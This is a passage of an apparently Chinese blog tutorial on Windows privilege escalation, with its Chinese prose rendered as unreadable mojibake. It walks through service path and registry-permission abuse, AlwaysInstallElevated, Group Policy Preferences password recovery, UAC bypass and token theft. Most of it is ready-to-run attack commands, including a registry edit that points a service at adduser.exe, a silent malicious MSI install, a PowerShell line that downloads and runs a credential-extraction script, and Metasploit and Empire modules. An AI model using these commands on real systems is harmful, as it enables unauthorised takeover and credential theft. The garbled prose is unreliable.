class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#wmiæŸ¥æ‰¾å«æœ‰æ¼æ´çš„æœåŠ¡å‘½ä»¤</span><br><span class="line">wmic service get name,displayname,pathname,startmode|findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr&#x2F;i &#x2F;v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">#PowerUpè„šæœ¬</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PowerShellEmpire&#x2F;PowerTools&#x2F;tree&#x2F;master&#x2F;PowerUp</span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp;&#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span><br><span class="line"></span><br><span class="line">##æŸ¥çœ‹æŒ‡å®šç›®å½•çš„æƒé™é…ç½®æƒ…å†µ</span><br><span class="line">accesschk.exe -dqv &quot;D:\test&quot; -accepteula</span><br></pre></td></tr></table></figure><p>æ¼æ´åˆ©ç”¨æ‰‹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#msfæ”»å‡»æ¨¡å—</span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;trusted_service_path</span><br><span class="line">set AutoRunScript migrate -f</span><br><span class="line"></span><br><span class="line">#æ‰‹åŠ¨æ”»å‡»</span><br><span class="line">æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„exeæ ¹æ®éœ€è¦é‡å‘½åå¹¶æ”¾ç½®åœ¨å¯å†™å…¥çš„æœ‰æ¼æ´ç›®å½•ä¸‹</span><br><span class="line">ç„¶åé‡å¯æœåŠ¡</span><br><span class="line">sc stop service_name</span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure><h4 id="2-3ä¸å®‰å…¨çš„æ³¨å†Œè¡¨æƒé™é…ç½®"><a href="#2-3ä¸å®‰å…¨çš„æ³¨å†Œè¡¨æƒé™é…ç½®" class="headerlink" title="2.3ä¸å®‰å…¨çš„æ³¨å†Œè¡¨æƒé™é…ç½®"></a>2.3ä¸å®‰å…¨çš„æ³¨å†Œè¡¨æƒé™é…ç½®</h4><p>ç®€ä»‹:åœ¨Windowsä¸­ï¼Œå’ŒWindowsæœåŠ¡æœ‰å…³çš„ä¿¡æ¯å­˜å‚¨åœ¨HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesæ³¨å†Œè¡¨é¡¹ä¸­,æœåŠ¡å¯¹åº”çš„ç¨‹åºè·¯å¾„å­˜å‚¨åœ¨HKEY_LOCAL_MACHINESYSTEMControlSet001ServicesVulnerable ServiceæœåŠ¡åImagePathï¼Œå¦‚æœä½æƒé™ç”¨æˆ·å¯¹è¿™ä¸ªé”®å€¼æœ‰å†™æƒé™ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ§åˆ¶è¿™ä¸ªæœåŠ¡ï¼Œè¿è¡Œæˆ‘ä»¬çš„ç¨‹åºï¼Œæ‹¿åˆ°é«˜æƒé™ã€‚</p><p>æ£€æµ‹æœåŠ¡çš„æ³¨å†Œè¡¨è·¯å¾„æ˜¯å¦æœ‰å†™æƒé™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#å¾®è½¯çš„å·¥å…·</span><br><span class="line">https:&#x2F;&#x2F;www.microsoft.com&#x2F;en-us&#x2F;download&#x2F;search.aspx?q&#x3D;subinacl</span><br><span class="line">subinacl.exe &#x2F;key reg &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnera</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#å¦‚æœæˆ‘ä»¬å¯¹æ³¨å†Œè¡¨æœ‰å†™å…¥æƒé™ï¼Œå°±å¯ä»¥ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œä½¿å¾—æœåŠ¡å¯åŠ¨æ—¶è¿è¡Œæˆ‘ä»¬çš„æ¶æ„ç¨‹åº&#96;</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINESYSTEMControlSet001ServicesVulnerable Service360rp&quot; &#x2F;t REG_EXPAND_SZ &#x2F;v ImagePath &#x2F;d &quot;C:programdataadduser.exe&quot; &#x2F;f</span><br></pre></td></tr></table></figure><h4 id="2-4å¯ç”¨æ³¨å†Œè¡¨é”®AlwaysInstallElevated"><a href="#2-4å¯ç”¨æ³¨å†Œè¡¨é”®AlwaysInstallElevated" class="headerlink" title="2.4å¯ç”¨æ³¨å†Œè¡¨é”®AlwaysInstallElevated"></a>2.4å¯ç”¨æ³¨å†Œè¡¨é”®AlwaysInstallElevated</h4><p>ç®€ä»‹ï¼šæ³¨å†Œè¡¨é”®AlwaysInstallElevatedæ˜¯ä¸€ä¸ªç­–ç•¥è®¾ç½®é¡¹ã€‚windowså…è®¸ä½æƒé™ç”¨æˆ·ä»¥Systemæƒé™è¿è¡Œå®‰è£…æ–‡ä»¶ã€‚å¦‚æœå¯ç”¨æ­¤ç­–ç•¥è®¾ç½®é¡¹ï¼Œé‚£ä¹ˆä»»ä½•æƒé™ç”¨æˆ·éƒ½èƒ½ä»¥NT AUTHORITYSYSTEMæƒé™æ¥å®‰è£…æ¶æ„çš„MSI(Microsoft Windows Installer)æ–‡ä»¶ã€‚</p><p>æŸ¥çœ‹æ˜¯å¦å¯ç”¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#PowerUp</span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module .\PowerUp.ps1;Get-RegistryAlwaysInstallElevated&#125;&quot;</span><br><span class="line"></span><br><span class="line">#å½“ç„¶ä¹Ÿå¯ä»¥æŸ¥çœ‹æ³¨å†Œè¡¨é”®å€¼æ˜¯å¦è¢«å®šä¹‰</span><br><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–¹å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#åˆ©ç”¨æ–¹æ³•,å¯ç”¨AlwaysInstallElevatedåï¼Œå¯ä»¥é€šè¿‡å‘½ä»¤è¡Œè°ƒç”¨msiexecå®‰è£…msiæ–‡ä»¶ï¼Œmsiæ–‡ä»¶å†…åŒ…å«è¦æ‰§è¡Œçš„Payloadï¼ŒPayloadå°†ä¼šä»¥Systemæƒé™æ‰§è¡Œ</span><br><span class="line">msiexec &#x2F;quiet &#x2F;qn &#x2F;i muma.msi</span><br><span class="line"></span><br><span class="line">#msf   éœ€è¦ä¸€ä¸ªä¼šè¯</span><br><span class="line">run exploit&#x2F;windows&#x2F;local&#x2F;always_install_elevated</span><br></pre></td></tr></table></figure><h3 id="3-ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ"><a href="#3-ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ" class="headerlink" title="3.ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ"></a>3.ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ</h3><p>ç®€ä»‹ï¼šWindows 2008 Serverå¼•å…¥äº†ä¸€é¡¹æ–°åŠŸèƒ½ï¼šç­–ç•¥é¦–é€‰é¡¹ï¼Œç»„ç­–ç•¥é¦–é€‰é¡¹ä½¿ç®¡ç†å‘˜å¯ä»¥éƒ¨ç½²å½±å“åŸŸä¸­è®¡ç®—æœº/ç”¨æˆ·çš„ç‰¹å®šé…ç½®ï¼Œé€šè¿‡åœ¨ç»„ç­–ç•¥ç®¡ç†æ§åˆ¶å°ä¸­é…ç½®çš„ç»„ç­–ç•¥é¦–é€‰é¡¹ï¼Œç®¡ç†å‘˜å¯ä»¥æ¨å‡ºå¤šç§ç­–ç•¥ï¼Œä¾‹å¦‚ï¼Œå½“ç”¨æˆ·ç™»å½•å…¶è®¡ç®—æœºæ—¶è‡ªåŠ¨æ˜ å°„ç½‘ç»œé©±åŠ¨å™¨ï¼Œæ›´æ–°å†…ç½®ç®¡ç†å‘˜å¸æˆ·çš„ç”¨æˆ·åæˆ–å¯¹æ³¨å†Œè¡¨è¿›è¡Œæ›´æ”¹ã€‚<br><strong>SYSVOLï¼š</strong><br>SYSVOLæ˜¯AD(æ´»åŠ¨ç›®å½•)é‡Œé¢ä¸€ä¸ªå­˜å‚¨åŸŸå…¬å…±æ–‡ä»¶æœåŠ¡å™¨å‰¯æœ¬çš„å…±äº«æ–‡ä»¶å¤¹ï¼Œæ‰€æœ‰çš„è®¤è¯ç”¨æˆ·éƒ½å¯ä»¥è¯»å–ã€‚SYSVOLåŒ…æ‹¬ç™»å½•è„šæœ¬ï¼Œç»„ç­–ç•¥æ•°æ®ï¼Œä»¥åŠå…¶ä»–åŸŸæ§æ‰€éœ€è¦çš„åŸŸæ•°æ®ï¼Œè¿™æ˜¯å› ä¸ºSYSVOLèƒ½åœ¨æ‰€æœ‰åŸŸæ§é‡Œè¿›è¡Œè‡ªåŠ¨åŒæ­¥å’Œå…±äº«ã€‚</p><p>æ‰€æœ‰çš„ç»„ç­–ç•¥å‡å­˜å‚¨åœ¨å¦‚ä¸‹ä½ç½®ï¼š <code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code> </p><p><strong>ç»„ç­–ç•¥åå¥½GPP</strong><br>win2008å‘å¸ƒäº†GPP(Group Policy Preferences)ï¼Œå…¶ä¸­GPPæœ€æœ‰ç”¨çš„ç‰¹æ€§ï¼Œæ˜¯åœ¨æŸäº›åœºæ™¯å­˜å‚¨å’Œä½¿ç”¨å‡­æ®ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼šæ˜ å°„é©±åŠ¨ï¼ˆDrives.xmlï¼‰åˆ›å»ºæœ¬åœ°ç”¨æˆ·æ•°æ®æºï¼ˆDataSources.xmlï¼‰æ‰“å°æœºé…ç½®ï¼ˆPrinters.xmlï¼‰åˆ›å»º/æ›´æ–°æœåŠ¡ï¼ˆServices.xmlï¼‰è®¡åˆ’ä»»åŠ¡ï¼ˆScheduledTasks.xmlï¼‰æ›´æ”¹æœ¬åœ°Administratorå¯†ç </p><p>ä¸ºæ–¹ä¾¿å¯¹æ‰€æœ‰æœºå™¨è¿›è¡Œæ“ä½œï¼Œç½‘ç»œç®¡ç†å‘˜ä¼šä½¿ç”¨åŸŸç­–ç•¥è¿›è¡Œç»Ÿä¸€çš„é…ç½®å’Œç®¡ç†ï¼Œé‚£ä¹ˆæ‰€æœ‰æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç å°±æ˜¯ä¸€æ ·çš„ï¼Œé€ æˆäº†å³ä½¿ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹ä¹Ÿèƒ½ä¿®æ”¹ç»„ç­–ç•¥é¦–é€‰é¡¹çš„å¯†ç ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è„šæœ¬ç ´è§£ç»„ç­–ç•¥é¦–é€‰é¡¹æ–‡ä»¶ä¸­å¯†ç çš„æ¼æ´ã€‚</p><p>åˆ©ç”¨æ‰‹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#Powershellè·å–cpassword</span><br><span class="line">Get-GPPPassword.ps1</span><br><span class="line"></span><br><span class="line">#PowerSploit çš„ Get-GPPPasswordæ¨¡å— æ£€ç´¢é€šè¿‡ç»„ç­–ç•¥é¦–é€‰é¡¹æ¨é€çš„å¸æˆ·çš„æ˜æ–‡å¯†ç å’Œå…¶ä»–ä¿¡æ¯ã€‚</span><br><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword</span><br><span class="line">kali gpp-decryptå‘½ä»¤ç ´è§£å¯†ç </span><br><span class="line"></span><br><span class="line">#Msf</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp</span><br><span class="line"></span><br><span class="line">#Empire</span><br><span class="line">usemodule privesc&#x2F;gpp</span><br></pre></td></tr></table></figure><h3 id="4-bypassUACææƒ"><a href="#4-bypassUACææƒ" class="headerlink" title="4. bypassUACææƒ"></a>4. bypassUACææƒ</h3><p>ç®€ä»‹ï¼šbypassUACå·²ç»æ˜¯è€ç”Ÿé•¿è°ˆçš„è¯é¢˜äº†ï¼Œç”¨æˆ·å¸æˆ·æ§åˆ¶(UAC)ï¼Œå®ƒæ˜¯Windowsçš„ä¸€ä¸ªå®‰å…¨åŠŸèƒ½ï¼Œå®ƒæ”¯æŒé˜²æ­¢å¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œæœªç»æˆæƒçš„ä¿®æ”¹ï¼ŒUACç¡®ä¿ä»…åœ¨ç®¡ç†å‘˜æˆæƒçš„æƒ…å†µä¸‹è¿›è¡ŒæŸäº›æ›´æ”¹ã€‚<br><strong>UACå¦‚ä½•è¿è¡Œï¼Ÿ</strong><br>UACé€šè¿‡é˜»æ­¢ç¨‹åºæ‰§è¡Œä»»ä½•æ¶‰åŠæœ‰å…³ç³»ç»Ÿæ›´æ”¹/ç‰¹å®šä»»åŠ¡çš„ä»»åŠ¡æ¥è¿è¡Œã€‚é™¤éå°è¯•æ‰§è¡Œè¿™äº›æ“ä½œçš„è¿›ç¨‹ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œï¼Œå¦åˆ™è¿™äº›æ“ä½œå°†æ— æ³•è¿è¡Œã€‚å¦‚æœæ‚¨ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œç¨‹åºï¼Œåˆ™å®ƒå°†å…·æœ‰æ›´å¤šæƒé™ï¼Œå› ä¸ºå®ƒå°†è¢«â€œæå‡æƒé™â€ï¼Œè€Œä¸æ˜¯ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œçš„ç¨‹åºã€‚</p><p>ä¸€äº›æ²¡æœ‰ç®¡ç†å‘˜æƒé™æ— æ³•å®Œæˆçš„æ“ä½œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">æ³¨å†Œè¡¨ä¿®æ”¹ï¼ˆå¦‚æœæ³¨å†Œè¡¨é¡¹åœ¨HKEY_LOCAL_MACHINEä¸‹ï¼ˆå› ä¸ºå®ƒå½±å“å¤šä¸ªç”¨æˆ·ï¼‰ï¼Œå®ƒå°†æ˜¯åªè¯»çš„ï¼‰</span><br><span class="line"></span><br><span class="line">åŠ è½½è®¾å¤‡é©±åŠ¨ç¨‹åº</span><br><span class="line"></span><br><span class="line">DLLæ³¨å…¥</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹ç³»ç»Ÿæ—¶é—´ï¼ˆæ—¶é’Ÿï¼‰</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹ç”¨æˆ·å¸æˆ·æ§åˆ¶è®¾ç½®ï¼ˆé€šè¿‡æ³¨å†Œè¡¨ï¼Œå¯ä»¥å¯ç”¨&#x2F;ç¦ç”¨è¯¥è®¾ç½®ï¼Œä½†æ‚¨éœ€è¦æ­£ç¡®çš„æƒé™æ‰èƒ½æ‰§è¡Œæ­¤æ“ä½œï¼‰</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹å—ä¿æŠ¤çš„ç›®å½•ï¼ˆä¾‹å¦‚Windowsæ–‡ä»¶å¤¹ï¼ŒProgram Filesï¼‰</span><br><span class="line"></span><br><span class="line">è®¡åˆ’ä»»åŠ¡ï¼ˆä¾‹å¦‚ï¼Œä»¥ç®¡ç†å‘˜æƒé™è‡ªåŠ¨å¯åŠ¨ï¼‰</span><br></pre></td></tr></table></figure><p>UACä¸ä¼šè‡ªåŠ¨é˜»æ­¢æ¶æ„è½¯ä»¶ï¼Œå…¶ç›®çš„ä¸æ˜¯ç¡®å®šç¨‹åºæ˜¯å¦æ˜¯æ¶æ„è½¯ä»¶ï¼Œè€Œæ˜¯åœ¨æ²¡æœ‰ç”¨æˆ·è®¸å¯ä¸‹å¯¹æ¶æ„è½¯ä»¶çš„æœªæˆæƒè¡Œä¸ºè¿›è¡ŒæŒæ§ã€‚</p><p>åˆ©ç”¨æ‰‹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#Msf</span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;ask       #å¼¹å‡ºUACç¡®è®¤çª—å£ï¼Œç‚¹å‡»åè·å¾—systemæƒé™</span><br><span class="line"></span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac  #æ­¤æ¨¡å—å°†é€šè¿‡è¿›ç¨‹æ³¨å…¥ä½¿ç”¨å¯ä¿¡ä»»å‘å¸ƒè€…è¯ä¹¦ç»•è¿‡Windows UACï¼Œå®ƒå°†ç”Ÿæˆå…³é—­UACæ ‡å¿—çš„ç¬¬äºŒä¸ªshellã€‚</span><br><span class="line"></span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection #æ­¤æ¨¡å—å°†é€šè¿‡è¿›ç¨‹æ³¨å…¥ä½¿ç”¨å¯ä¿¡ä»»çš„å‘å¸ƒè€…è¯ä¹¦ç»•è¿‡Windows UACã€‚å®ƒå°†ç”Ÿæˆå…³é—­UACæ ‡å¿—çš„ç¬¬äºŒä¸ªshellã€‚åœ¨æ™®é€šæŠ€æœ¯ä¸­ï¼Œè¯¥æ¨¡å—ä½¿ç”¨åå°„å¼DLLæ³¨å…¥æŠ€æœ¯å¹¶åªé™¤å»äº†DLL payload äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ä¸‰ä¸ªå•ç‹¬çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œå®ƒéœ€è¦é€‰æ‹©æ­£ç¡®çš„ä½“ç³»æ¶æ„ï¼ˆå¯¹äºSYSWOW64ç³»ç»Ÿä¹Ÿä½¿ç”¨x64ï¼‰ã€‚å¦‚æœæŒ‡å®šexe::customï¼Œåº”åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­å¯åŠ¨ payload åè°ƒç”¨ExitProcessï¼ˆï¼‰</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_fodhelper#æ­¤æ¨¡å—å°†é€šè¿‡åœ¨å½“å‰ç”¨æˆ·é…ç½®å•å…ƒä¸‹åŠ«æŒæ³¨å†Œè¡¨ä¸­çš„ç‰¹æ®Šé”®å¹¶æ’å…¥å°†åœ¨å¯åŠ¨Windows fodhelper.exeåº”ç”¨ç¨‹åºæ—¶è°ƒç”¨çš„è‡ªå®šä¹‰å‘½ä»¤æ¥ç»•è¿‡Windows 10 UACã€‚å®ƒå°†ç”Ÿæˆå…³é—­UACæ ‡å¿—çš„ç¬¬äºŒä¸ªshellã€‚æ­¤æ¨¡å—ä¿®æ”¹æ³¨å†Œè¡¨é¡¹ï¼Œä½†åœ¨è°ƒç”¨payloadåå°†æ¸…é™¤è¯¥é¡¹ã€‚è¯¥æ¨¡å—ä¸éœ€è¦payloadçš„ä½“ç³»æ¶æ„å’Œæ“ä½œç³»ç»ŸåŒ¹é…ã€‚å¦‚æœæŒ‡å®šexe:customï¼Œåˆ™åº”åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­å¯åŠ¨payloadåè°ƒç”¨ExitProcessï¼ˆï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr#æ­¤æ¨¡å—å°†é€šè¿‡åœ¨å½“å‰ç”¨æˆ·é…ç½®å•å…ƒä¸‹åŠ«æŒæ³¨å†Œè¡¨ä¸­çš„ç‰¹æ®Šé”®å¹¶æ’å…¥å°†åœ¨å¯åŠ¨Windowsäº‹ä»¶æŸ¥çœ‹å™¨æ—¶è°ƒç”¨çš„è‡ªå®šä¹‰å‘½ä»¤æ¥ç»•è¿‡Windows UACã€‚å®ƒå°†ç”Ÿæˆå…³é—­UACæ ‡å¿—çš„ç¬¬äºŒä¸ªshellã€‚æ­¤æ¨¡å—ä¿®æ”¹æ³¨å†Œè¡¨é¡¹ï¼Œä½†åœ¨è°ƒç”¨payloadåå°†æ¸…é™¤è¯¥é¡¹ã€‚è¯¥æ¨¡å—ä¸éœ€è¦payloadçš„ä½“ç³»æ¶æ„å’Œæ“ä½œç³»ç»ŸåŒ¹é…ã€‚å¦‚æœæŒ‡å®šEXE ::Customï¼Œåˆ™åº”åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­å¯åŠ¨payloadåè°ƒç”¨ExitProcessï¼ˆï¼‰</span><br><span class="line"></span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_comhijack#æ­¤æ¨¡å—å°†é€šè¿‡åœ¨hkcué…ç½®å•å…ƒä¸­åˆ›å»ºCOMå¤„ç†ç¨‹åºæ³¨å†Œè¡¨é¡¹æ¥ç»•è¿‡Windows UACã€‚å½“åŠ è½½æŸäº›è¾ƒé«˜å®Œæ•´æ€§çº§åˆ«è¿›ç¨‹æ—¶ï¼Œä¼šå¼•ç”¨è¿™äº›æ³¨å†Œè¡¨é¡¹ï¼Œä»è€Œå¯¼è‡´è¿›ç¨‹åŠ è½½ç”¨æˆ·æ§åˆ¶çš„DLL,è¿™äº›DLLåŒ…å«å¯¼è‡´ä¼šè¯æƒé™æå‡çš„payloadã€‚æ­¤æ¨¡å—ä¿®æ”¹æ³¨å†Œè¡¨é¡¹ï¼Œä½†åœ¨è°ƒç”¨payloadåå°†æ¸…é™¤è¯¥é¡¹,è¿™ä¸ªæ¨¡å—éœ€è¦payloadçš„ä½“ç³»æ¶æ„å’Œæ“ä½œç³»ç»ŸåŒ¹é…ï¼Œä½†æ˜¯å½“å‰çš„ä½æƒé™meterpreterä¼šè¯ä½“ç³»æ¶æ„ä¸­å¯èƒ½ä¸åŒã€‚å¦‚æœæŒ‡å®šexe:ï¼šcustomï¼Œåˆ™åº”åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­å¯åŠ¨payloaåè°ƒç”¨ExitProcessï¼ˆï¼‰ã€‚æ­¤æ¨¡å—é€šè¿‡ç›®æ ‡ä¸Šçš„cmd.exeè°ƒç”¨ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶,å› æ­¤ï¼Œå¦‚æœcmd.exeè®¿é—®å—åˆ°é™åˆ¶ï¼Œæ­¤æ¨¡å—å°†æ— æ³•æ­£å¸¸è¿è¡Œã€‚</span><br><span class="line"></span><br><span class="line">#Powershell</span><br><span class="line">Invoke-PsUACme</span><br><span class="line"></span><br><span class="line">#Empire</span><br><span class="line">usemodule privesc&#x2F;bypassuac</span><br><span class="line">usemodule privesc&#x2F;bypassuac_wscript</span><br><span class="line"></span><br><span class="line">#cs</span><br><span class="line">uac-dll</span><br><span class="line">uac-token-duplication</span><br><span class="line">....</span><br></pre></td></tr></table></figure><h3 id="5-ä»¤ç‰Œçªƒå–"><a href="#5-ä»¤ç‰Œçªƒå–" class="headerlink" title="5.ä»¤ç‰Œçªƒå–"></a>5.ä»¤ç‰Œçªƒå–</h3><p>ç®€ä»‹ï¼šä»¤ç‰Œ(token)æ˜¯ç³»ç»Ÿçš„ä¸´æ—¶ç§˜é’¥ï¼Œç›¸å½“äºè´¦å·å’Œå¯†ç ï¼Œç”¨æ¥å†³å®šæ˜¯å¦å…è®¸è¿™æ¬¡è¯·æ±‚å’Œåˆ¤æ–­è¿™æ¬¡è¯·æ±‚æ˜¯å±äºå“ªä¸€ä¸ªç”¨æˆ·çš„ã€‚å®ƒå…è®¸ä½ åœ¨ä¸æä¾›å¯†ç æˆ–å…¶ä»–å‡­è¯çš„å‰æä¸‹ï¼Œè®¿é—®ç½‘ç»œå’Œç³»ç»Ÿèµ„æºï¼Œè¿™äº›ä»¤ç‰Œå°†æŒç»­å­˜åœ¨äºç³»ç»Ÿä¸­ï¼Œé™¤éç³»ç»Ÿé‡æ–°å¯åŠ¨ã€‚</p><p>ä»¤ç‰Œæœ‰å¾ˆå¤šç§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è®¿é—®ä»¤ç‰Œ(Access Token)ï¼šè¡¨ç¤ºè®¿é—®æ§åˆ¶æ“ä½œä¸»ä½“çš„ç³»ç»Ÿå¯¹è±¡ ã€‚</span><br><span class="line"></span><br><span class="line">ä¼šè¯ä»¤ç‰Œ(Session Token)ï¼šæ˜¯äº¤äº’ä¼šè¯ä¸­å”¯ä¸€çš„èº«ä»½æ ‡è¯†ç¬¦ã€‚</span><br><span class="line"></span><br><span class="line">å¯†ä¿ä»¤ç‰Œ(Security Token)ï¼šåˆå«åšè®¤è¯ä»¤ç‰Œæˆ–ç¡¬ä»¶ä»¤ç‰Œï¼Œæ˜¯ä¸€ç§è®¡ç®—æœºèº«ä»½æ ¡éªŒçš„ç‰©ç†è®¾å¤‡ï¼Œä¾‹å¦‚Uç›¾ã€‚</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–¹å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#msf æ‹¿åˆ°ä¸€ä¸ªä¼šè¯</span><br><span class="line">use incognito           #è¿›å…¥incognitoæ¨¡å—</span><br><span class="line">list_tokens -u          #åˆ—å‡ºä»¤ç‰Œ</span><br><span class="line">Delegation Tokenï¼šä¹Ÿå°±æ˜¯æˆæƒä»¤ç‰Œï¼Œå®ƒæ”¯æŒäº¤äº’å¼ç™»å½•(ä¾‹å¦‚å¯ä»¥é€šè¿‡è¿œç¨‹æ¡Œé¢ç™»å½•è®¿é—®)</span><br><span class="line">Impresonation Tokenï¼šæ¨¡æ‹Ÿä»¤ç‰Œï¼Œå®ƒæ˜¯éäº¤äº’çš„ä¼šè¯ã€‚</span><br><span class="line"></span><br><span class="line">è¿™é‡Œçªƒå–ä»¤ç‰Œï¼Œä¸»è¦æ˜¯çªƒå–è¿›ç¨‹ä¸­çš„ä»¤ç‰Œ</span><br><span class="line">#ä½¿ç”¨ä»¤ç‰Œå‡å†’ç”¨æˆ·</span><br><span class="line">impresonate_Token &quot;ä»¤ç‰Œå&quot;</span><br><span class="line">......</span><br><span class="line">è¿™é‡Œä¹Ÿå¯ä»¥ç”¨å…¶ä»–çš„csï¼Œempireä¸Šé¢çš„ä»¤ç‰Œçªƒå–åŠŸèƒ½æ¨¡å—</span><br></pre></td></tr></table></figure><p>è¯´èµ·ä»¤ç‰Œï¼Œè®©æˆ‘æƒ³åˆ°äº†åœŸè±†ï¼ˆåŠ æ¨¡ä»¿é«˜æƒé™ä»¤ç‰Œï¼‰ï¼ï¼ï¼ï¼è¿™ç©æ„çœŸå¥½ç”¨ï¼ŒçœŸç‰›é€¼ï¼</p><p>é¡¹ç›®åœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 